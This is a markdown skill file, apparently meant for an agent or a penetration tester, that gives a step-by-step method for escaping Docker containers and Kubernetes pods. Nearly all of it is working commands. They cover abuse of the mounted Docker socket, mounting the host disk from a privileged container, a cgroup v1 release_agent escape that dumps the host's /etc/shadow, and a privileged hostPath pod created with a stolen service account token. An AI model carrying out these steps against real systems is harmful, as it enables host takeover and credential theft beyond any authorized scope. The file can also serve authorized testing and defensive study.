---
name: container-escape
description: Container escape methodology for Docker and Kubernetes. Covers privileged container breakout, mounted socket exploitation, capabilities abuse, cgroup v1 escape, and K8s node compromise.
version: 1.0.0
license: Apache-2.0
---

# Container Escape

## Phase 1 — Enumerate Container Context

```bash
# Am I in a container?
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# What privileges do I have?
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# Is Docker socket mounted?
ls -la /var/run/docker.sock

# Is the container privileged?
ip link add dummy0 type dummy 2>&1 | grep -v "Permission denied"
# → if no error, you likely have CAP_NET_ADMIN (privileged indicator)
```

## Attack 1 — Docker Socket Escape

If `/var/run/docker.sock` is mounted:

```bash
# Start a new privileged container with host filesystem mounted
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --pid=host --net=host \
  -v /:/host ubuntu chroot /host

# OR via API directly (no docker CLI needed)
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

## Attack 2 — Privileged Container Breakout

```bash
# Mount host filesystem via device access
fdisk -l                    # find host disk (e.g., /dev/xvda1)
mkdir /mnt/host
mount /dev/xvda1 /mnt/host
chroot /mnt/host /bin/bash  # shell as root on host
```

## Attack 3 — cgroup v1 Escape (CVE-2022-0492)

```bash
# Requires CAP_SYS_ADMIN or unconfined seccomp
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```

## Kubernetes Node Escape

```bash
# From compromised pod — access node via service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/nodes

# Escalate via privileged pod (if create pod permissions exist)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF
```

## Tools

- [CDK](https://github.com/cdk-team/CDK) — container/K8s pentest toolkit
- [deepce](https://github.com/stealthcopter/deepce) — container enumeration
- [Kubescape](https://github.com/kubescape/kubescape) — K8s risk assessment

## MITRE ATT&CK

- T1611 — Escape to Host
- T1552.007 — Container API
